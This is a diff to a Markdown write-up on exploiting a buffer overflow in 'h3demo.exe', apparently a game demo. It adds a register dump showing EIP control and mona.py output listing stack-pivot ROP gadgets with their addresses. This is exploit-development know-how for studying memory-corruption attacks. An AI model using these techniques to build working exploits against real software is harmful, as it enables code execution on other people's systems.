@@ -135,6 +135,7 @@ We do control the EIP, but the question was, what's next? We cannot just jump to
 
 ![](img/registers.png)
 
+```
 EAX : 00000000
 EBX : 00000000
 ECX : 42424242
@@ -144,6 +145,7 @@ ESP : 0019BE68
 ESI : 00000000
 EDI : 00000000
 EIP : 42424242
+```
 
 The ESP is at 0x0019BE68 and we want to pivot it down the stack to array we control: [0x0019C43C-...].
 
@@ -156,7 +158,29 @@ Run `demo.exe` under `Immunity Debugger`, set workdir with command: `!mona confi
 4) stackpivot.txt
 files.
 
-For now the interesting one is `stackpivot.txt.` We can use it to find some useful gadgets.
+For now the interesting one is `stackpivot.txt.` We can use it to find some useful gadgets. It is really amazing. It generated over 20k possible pivots and sorted for us:
+
+```
+# stackpivot.txt
+Stack pivots, minimum distance 8
+-------------------------------------
+Non-SafeSEH protected pivots :
+------------------------------
+0x00402b88 : {pivot 8 / 0x08} :  # POP ESI # POP EBX # RETN 0x0C    ** [h3demo.exe] **   |  startnull {PAGE_EXECUTE_READ}
+0x00402cb4 : {pivot 8 / 0x08} :  # POP ESI # POP EBX # RETN 0x0C    ** [h3demo.exe] **   |  startnull {PAGE_EXECUTE_READ}
+0x00402fdf : {pivot 8 / 0x08} :  # POP EBP # POP EBX # RETN 0x0C    ** [h3demo.exe] **   |  startnull {PAGE_EXECUTE_READ}
+0x004038f7 : {pivot 8 / 0x08} :  # ADD ESP,8 # RETN 0x0C    ** [h3demo.exe] **   |  startnull {PAGE_EXECUTE_READ}
+0x00403914 : {pivot 8 / 0x08} :  # ADD ESP,8 # RETN 0x0C    ** [h3demo.exe] **   |  startnull,asciiprint,ascii {PAGE_EXECUTE_READ}
+0x0040398c : {pivot 8 / 0x08} :  # ADD ESP,8 # RETN 0x0C    ** [h3demo.exe] **   |  startnull {PAGE_EXECUTE_READ}
+0x004039ee : {pivot 8 / 0x08} :  # ADD ESP,8 # RETN 0x0C    ** [h3demo.exe] **   |  startnull {PAGE_EXECUTE_READ}
+[...]
+0x0042988f : {pivot 1672 / 0x688} :  # POP EBX # ADD ESP,684 # RETN 0x04    ** [h3demo.exe] **   |  startnull {PAGE_EXECUTE_READ}
+0x004298a5 : {pivot 1672 / 0x688} :  # POP EBX # ADD ESP,684 # RETN 0x04    ** [h3demo.exe] **   |  startnull {PAGE_EXECUTE_READ}
+0x0054a7e3 : {pivot 1816 / 0x718} :  # ADD ESP,718 # RETN 0x04    ** [h3demo.exe] **   |  startnull {PAGE_EXECUTE_READ}
+0x0054a803 : {pivot 1816 / 0x718} :  # ADD ESP,718 # RETN 0x04    ** [h3demo.exe] **   |  startnull {PAGE_EXECUTE_READ}
+0x0054acb1 : {pivot 1816 / 0x718} :  # ADD ESP,718 # RETN 0x04    ** [h3demo.exe] **   |  startnull {PAGE_EXECUTE_READ}
+[...]
+```
 
 ## 
 
